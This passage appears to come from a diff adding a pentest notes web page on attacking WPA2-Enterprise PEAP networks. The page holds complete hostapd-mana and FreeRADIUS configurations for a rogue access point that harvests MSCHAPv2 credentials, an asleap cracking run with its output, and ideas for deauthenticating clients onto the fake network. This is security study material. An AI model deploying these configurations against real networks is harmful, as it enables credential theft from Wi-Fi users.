+<span class="c1"># openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -outform pem -out PEM_OUTPUT.crt</span>
+
+<span class="c1"># [Terminal Two]</span>
+<span class="c1"># Setup FreeRADIUS</span>
+sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>freeradius<span class="w"> </span>-y
+
+<span class="c1"># Grab info about certs</span>
+openssl<span class="w"> </span>x509<span class="w"> </span>-inform<span class="w"> </span>der<span class="w"> </span>-in<span class="w"> </span>DER_CERTIFICATE_FILENAME<span class="w"> </span>-text
+
+<span class="c1"># Alter FreeRADIUS in the CA block</span>
+sudo<span class="w"> </span>vi<span class="w"> </span>/etc/freeradius/3.0/certs/ca.cnf
+
+<span class="o">[</span>certificate_authority<span class="o">]</span>
+<span class="nv">countryName</span><span class="w">             </span><span class="o">=</span><span class="w"> </span>US
+<span class="nv">stateOrProvinceName</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>OR
+<span class="nv">localityName</span><span class="w">            </span><span class="o">=</span><span class="w"> </span>Portland
+<span class="nv">organizationName</span><span class="w">        </span><span class="o">=</span><span class="w"> </span>Ashat
+<span class="nv">emailAddress</span><span class="w">            </span><span class="o">=</span><span class="w"> </span>ca@ashat.com
+<span class="nv">commonName</span><span class="w">              </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Ashat Certificate Authority&quot;</span>
+
+<span class="c1"># Alter FreeRADIUS server block w/same info</span>
+<span class="o">[</span>certificate_authority<span class="o">]</span>
+<span class="nv">countryName</span><span class="w">             </span><span class="o">=</span><span class="w"> </span>US
+<span class="nv">stateOrProvinceName</span><span class="w">     </span><span class="o">=</span><span class="w"> </span>OR
+<span class="nv">localityName</span><span class="w">            </span><span class="o">=</span><span class="w"> </span>Portland
+<span class="nv">organizationName</span><span class="w">        </span><span class="o">=</span><span class="w"> </span>Ashat
+<span class="nv">emailAddress</span><span class="w">            </span><span class="o">=</span><span class="w"> </span>ca@ashat.com
+<span class="nv">commonName</span><span class="w">              </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Ashat Certificate Authority&quot;</span>
+
+<span class="nb">cd</span><span class="w"> </span>/etc/freeradius/3.0/certs/
+rm<span class="w"> </span>dh<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>make
+
+<span class="c1"># Ignore the error</span>
+</code></pre></div>
+<h2 id="host-mana-section">HOST-MANA SECTION</h2>
+<div class="highlight"><pre><span></span><code># Create the mana file - from Andrew Long
+
+# SSID of the AP
+ssid=NetworkName
+
+# Network interface to use and driver type
+# We must ensure the interface lists &#39;AP&#39; in &#39;Supported interface modes&#39; when running &#39;iw phy PHYX info&#39;
+interface=wlan0
+driver=nl80211
+
+# Channel and mode
+# Make sure the channel is allowed with &#39;iw phy PHYX info&#39; (&#39;Frequencies&#39; field - there can be more than one)
+
+channel=1 #update this
+
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
+
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
+
+# Key workaround for Win XP
+eapol_key_index_workaround=0
+
+# EAP user file we created earlier
+eap_user_file=/etc/hostapd-mana/mana.eap_user
+
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually &#39;whatever&#39;
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+
+# Enable Mana WPE
+mana_wpe=1
+
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+
+# Send EAP success, so the client thinks it&#39;s connected
+mana_eapsuccess=1
+
+# EAP TLS MitM
+mana_eaptls=1
+
+-------------------
+
+# SSID of the AP
+ssid=Playtronics
+
+# Network interface to use and driver type
+# We must ensure the interface lists &#39;AP&#39; in &#39;Supported interface modes&#39; when running &#39;iw phy PHYX info&#39;
+interface=wlan0
+driver=nl80211
+
+# Channel and mode
+# Make sure the channel is allowed with &#39;iw phy PHYX info&#39; (&#39;Frequencies&#39; field - there can be more than one)
+channel=1
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
+
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
+
+# Key workaround for Win XP
+eapol_key_index_workaround=0
+
+# EAP user file we created earlier
+eap_user_file=/etc/hostapd-mana/mana.eap_user
+
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually &#39;whatever&#39;
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+
+# Enable Mana WPE
+mana_wpe=1
+
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+
+# Send EAP success, so the client thinks it&#39;s connected
+mana_eapsuccess=1
+
+# EAP TLS MitM
+mana_eaptls=1
+
+# MOVE THE FILE TO /etc/hostapd-mana/mana.conf
+#-----------------------------
+# mana.eap_user
+
+*     PEAP,TTLS,TLS,FAST
+&quot;t&quot;   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    &quot;pass&quot;   [2]
+
+
+-------------------
+
+*     PEAP,TTLS,TLS,FAST
+&quot;t&quot;   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    &quot;pass&quot;   [2]
+
+
+# MOVE THE FILE TO /etc/hostapd-mana/mana.eap_user
+
+# Start hostapd-mana
+sudo hostapd-mana /etc/hostapd-mana/mana.conf
+
+
+# Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and # run command like so:
+
+asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W $WORDLIST
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>vi wpa_supplicant.conf
+
+network={
+  ssid=&quot;NetworkName&quot;
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  identity=&quot;Domain\username&quot;
+  password=&quot;password&quot;
+  eap=PEAP
+  phase1=&quot;peaplabel=0&quot;
+  phase2=&quot;auth=MSCHAPV2&quot;
+}
+
+wpa_supplicant -c wpa_supplicant.conf
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>When a victim attempts to authenticate to our AP, the login attempt is captured.
+
+...
+wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: authenticated
+wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 00:2b:bb:b0:42:9e
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+MANA EAP Identity Phase 0: cosmo
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+MANA EAP Identity Phase 1: cosmo
+MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
+MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
+MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
+
+method=2511 tells us that the chosen authentication is PEAP, and the line below that one includes the username cosmo. These credentials are also in /tmp/hostapd.credout.
+
+When starting hostapd, we will append -B to run it in the background. The first few lines of hostapd will be displayed before it goes into the background, where it will continue to run until it successfully at creates the AP.
+
+We will be using asleap to crack the password hash. We can copy/paste the output, starting with asleap, and append the wordlist /usr/share/john/password.lst to the -W parameter
+
+kali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
+asleap 2.2 - actively recover LEAP/PPTP passwords. &lt;jwright@hasborg.com&gt;
+Using wordlist mode with &quot;/usr/share/john/password.lst&quot;.
+        hash bytes:        586c
+        NT hash:           8846f7eaee8fb117ad06bdd830b7586c
+        password:          password
+...
+We recovered the password, password. Even if these credentials are not immediately useful to us, we&#39;ll make a note of them as they may be of use later in the pentest.
+
+In a live scenario, it is likely the device will keep connecting and hostapd will keep showing challenge/responses.
+
+There are a number of attack escalation opportunities at this point.
+
+A tool called crackapd12 can automatically run asleap when it sees credentials in the log file. If crackapd successfully recovers credentials, crackapd adds the user to hostapd eap_user file. This allows the user to successfully connect to our rogue AP.
+
+We could also provide Internet access by adding a DHCP server and a few nftables rules to enable routing, though we won&#39;t describe that approach in detail here.
+
+We could push the attack further and authenticate ourselves to the real AP. This, along with some different nftables rules, would provide the user access to the actual company network.
+
+If clients don&#39;t connect to our rogue AP, we can use another wireless card and look for the clients connected to the legitimate APs with airodump-ng. We would then use aireplay-ng and keep deauthenticating them. They may eventually connect to our AP, except in cases when the configuration has been locked down or if the network uses 802.11w.
+</code></pre></div>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://systemweakness.com/defeating-wpa2-enterprise-peap-authentication-418829b8922c">Andrew Long</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Challenge-Handshake_Authentication_Protocol">Challenge Handshake Authentication Protocol (CHAP)</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol">Extensible Authentication Protocol (EAP)</a></li>
+<li><a href="https://wiki.freeradius.org/protocol/EAP-PEAP">EAP PEAP Authentication Protocol</a>
+<a href="https://datatracker.ietf.org/doc/html/rfc5216">EAP-TLS Authentication Protocol</a></li>
+<li><a href="* [Extensible Authentication Protocol (EAP)](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)">MS-CHAP</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Password_Authentication_Protocol">Password Authentication Protocol (PAP)</a></li>
+<li><a href="https://en.wikipedia.org/wiki/RADIUS">RADIUS</a></li>
+</ul>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "search.suggest", "search.highlight"], "search": "../../../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.a51614de.min.js"></script>
+      
+        
+          <script src="../../../../js/mkdocs-charts-plugin.js"></script>
+        
+      
+        
+          <script src="../../../../js/katex.js"></script>
+        
+      
+        
+          <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.js"></script>
+        
+      
+        
+          <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/contrib/auto-render.min.js"></script>
+        
+      
+        
+          <script src="../../../../js/mathjax.js"></script>
+        
+      
+        
+          <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+        
+      
+        
+          <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        
+      
+        
+          <script src="https://cdn.jsdelivr.net/npm/vega@5"></script>
+        
+      
+        
+          <script src="https://cdn.jsdelivr.net/npm/vega-lite@5"></script>
+        
+      
+        
+          <script src="https://cdn.jsdelivr.net/npm/vega-embed@6"></script>
+        
+      
+    
+  </body>
+</html>
